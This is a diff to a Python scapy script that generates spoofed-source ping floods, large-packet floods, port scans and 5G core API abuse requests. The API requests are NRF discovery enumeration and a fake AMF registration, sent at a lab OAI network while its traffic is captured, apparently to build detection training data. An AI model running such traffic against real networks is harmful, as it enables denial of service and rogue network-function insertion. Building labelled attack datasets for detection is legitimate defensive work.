@@ -1,8 +1,9 @@
 import subprocess
 import time
 import os
+import string
 import random
-from scapy.all import IP, TCP, ICMP, send
+from scapy.all import IP, TCP, ICMP, Raw, send, sr1
 import json
 
 # Define the list of specific source IPs for malicious traffic
@@ -13,7 +14,7 @@ def get_random_source_ip():
     return random.choice(malicious_source_ips)
 
 # Path for logging malicious traffic
-malicious_log_file = "/home/jared/oai-cn5g/flask_server/tmp/malicious_traffic_logs.txt"
+malicious_log_file = "/home/jared/Desktop/presentation/tmp/malicious_traffic_logs.txt"
 
 # Function to log malicious traffic details
 def log_malicious_traffic(entry):
@@ -39,7 +40,7 @@ def generate_large_packets():
     print("Generating large packet traffic...")
     ip_list = ["192.168.70.130"]
     for ip in ip_list:
-        source_ip = get_random_source_ip()
+        source_ip = "192.168.70.146"
         for i in range(10):  # Send 10 large packets
             packet = IP(src=source_ip, dst=ip) / TCP(dport=80, flags="A") / ("X" * 65000)
             send(packet, verbose=False)
@@ -62,31 +63,61 @@ def generate_port_scan():
             log_malicious_traffic(log_entry)
         time.sleep(1)
 
-# Function to simulate other attacks using curl
+def craft_http_get(src_ip, dst_ip, dst_port, path, headers=None):
+    sport = random.randint(1024, 65535)
+    seq = random.randint(1000000000, 2000000000)
+    
+    ip = IP(src=src_ip, dst=dst_ip)
+    tcp = TCP(sport=sport, dport=dst_port, flags="S", seq=seq)
+    
+    syn = ip/tcp
+    syn_ack = sr1(syn)
+    
+    tcp = TCP(sport=sport, dport=dst_port, flags="A", seq=seq+1, ack=syn_ack.seq+1)
+    
+    payload = f"GET {path} HTTP/1.1\r\nHost: {dst_ip}\r\n"
+    if headers:
+        for key, value in headers.items():
+            payload += f"{key}: {value}\r\n"
+    payload += "\r\n"
+    
+    request = ip/tcp/Raw(load=payload)
+    send(request)
+
+
 def amf_looking_for_udm(nrf_ip):
     print("Performing AMF looking for UDM attack...")
-    source_ip = get_random_source_ip()
-    url = f"http://{nrf_ip}:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM"
-    subprocess.run(["curl", "-X", "GET", "-H", f"Source-IP: {source_ip}", url], capture_output=True)
+    source_ip = "192.168.70.23"
+    path = "/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM"
+    craft_http_get(source_ip, nrf_ip, 8000, path)
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
-    log_entry = f"{timestamp} {source_ip} > {nrf_ip} Protocol: HTTP (AMF Looking for UDM)"
-    log_malicious_traffic(log_entry)
+    log_malicious_traffic(f"{timestamp} {source_ip} > {nrf_ip} Protocol: HTTP (AMF Looking for UDM)")
     time.sleep(1)
+
 
 def get_all_nfs(nrf_ip):
     print("Performing GetAllNFs attack...")
-    source_ip = get_random_source_ip()
-    url = f"http://{nrf_ip}:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF"
-    subprocess.run(["curl", "-X", "GET", "-H", f"Source-IP: {source_ip}", url], capture_output=True)
+    source_ip = "192.168.70.24"
+    path = "/nnrf-disc/v1/nf-instances?requester-nf-type=AMF"
+    craft_http_get(source_ip, nrf_ip, 8000, path)
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
-    log_entry = f"{timestamp} {source_ip} > {nrf_ip} Protocol: HTTP (GetAllNFs)"
-    log_malicious_traffic(log_entry)
+    log_malicious_traffic(f"{timestamp} {source_ip} > {nrf_ip} Protocol: HTTP (GetAllNFs)")
     time.sleep(1)
 
+def random_data_dump(nrf_ip):
+    print("Performing RandomDataDump attack...")
+    source_ip = "192.168.70.25"
+    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    path = f"/nnrf-disc/v1/nf-instances?requester-nf-type={random_string}&target-nf-type="
+    craft_http_get(source_ip, nrf_ip, 8000, path)
+    timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
+    log_malicious_traffic(f"{timestamp} {source_ip} > {nrf_ip} Protocol: HTTP (RandomDataDump)")
+    time.sleep(1)
+    
 # Function to simulate the FakeAMFInsert attack
 def fake_amf_insert():
     print("Performing FakeAMFInsert attack...")
-    source_ip = get_random_source_ip()
+    source_ip = "192.168.70.26"
     json_data = {
         "nfInstanceId": "b01dface-bead-cafe-bade-cabledfabled",
         "nfType": "AMF",
@@ -141,27 +172,14 @@ def fake_amf_insert():
         ]
     }
 
-    url = "http://192.168.70.132:8000/nnrf-nfm/v1/nf-instances/b01dface-bead-cafe-bade-cabledfabled"
+    path = "/nnrf-nfm/v1/nf-instances/b01dface-bead-cafe-bade-cabledfabled"
     headers = {"Content-Type": "application/json"}
-    curl_command = [
-        "curl", "-X", "PUT", "-H", f"Content-Type: application/json",
-        "-d", json.dumps(json_data), url
-    ]
-    subprocess.run(curl_command, capture_output=True)
+    craft_http_get(source_ip, "192.168.70.130", 8000, path, headers=headers)
 
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
-    log_entry = f"{timestamp} {source_ip} > 192.168.70.132 Protocol: HTTP (Fake AMF Insert)"
+    log_entry = f"{timestamp} {source_ip} > 192.168.70.130 Protocol: HTTP (Fake AMF Insert)"
     log_malicious_traffic(log_entry)
 
-def get_user_data(udm_ip, subscriber_id="0000000003"):
-    print("Performing GetUserData attack...")
-    source_ip = get_random_source_ip()
-    url = f"http://{udm_ip}:8000/nudm-dm/v1/imsi-{subscriber_id}/am-data?plmn-id=%7B%22mcc%22%3A%22208%22%2C%22mnc%22%3A%2293%22%7D"
-    subprocess.run(["curl", "-X", "GET", "-H", f"Source-IP: {source_ip}", url], capture_output=True)
-    timestamp = time.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
-    log_entry = f"{timestamp} {source_ip} > {udm_ip} Protocol: HTTP (Get User Data)"
-    log_malicious_traffic(log_entry)
-    time.sleep(1)
 
 # Function to filter out unwanted lines from the captured logs
 def filter_logs(input_file, output_file):
@@ -186,8 +204,8 @@ def capture_traffic():
     print("Starting traffic capture...")
     interface = "demo-oai"
     subnet = "192.168.70.0/24"
-    log_file_path = "/home/jared/oai-cn5g/flask_server/tmp/training_traffic_logs.txt"
-    filtered_log_file_path = "/home/jared/oai-cn5g/flask_server/tmp/filtered_traffic_logs.txt"
+    log_file_path = "/home/jared/Desktop/presentation/tmp/training_traffic_logs.txt"
+    filtered_log_file_path = "/home/jared/Desktop/presentation/tmp/filtered_traffic_logs.txt"
 
     available_interfaces = subprocess.check_output(["ip", "link", "show"]).decode('utf-8')
     print(f"Available network interfaces:\n{available_interfaces}")
@@ -219,10 +237,10 @@ def capture_traffic():
             generate_ping_flood()
             generate_large_packets()
             generate_port_scan()
-            amf_looking_for_udm(nrf_ip="192.168.70.130")
-            get_all_nfs(nrf_ip="192.168.70.130")
-            get_user_data(udm_ip="192.168.70.137")
-            fake_amf_insert()
+            #amf_looking_for_udm(nrf_ip="192.168.70.130")
+            #get_all_nfs(nrf_ip="192.168.70.130")
+            #fake_amf_insert()
+            #random_data_dump(nrf_ip="192.168.70.130")
 
             print("Traffic generation complete.")
         finally:
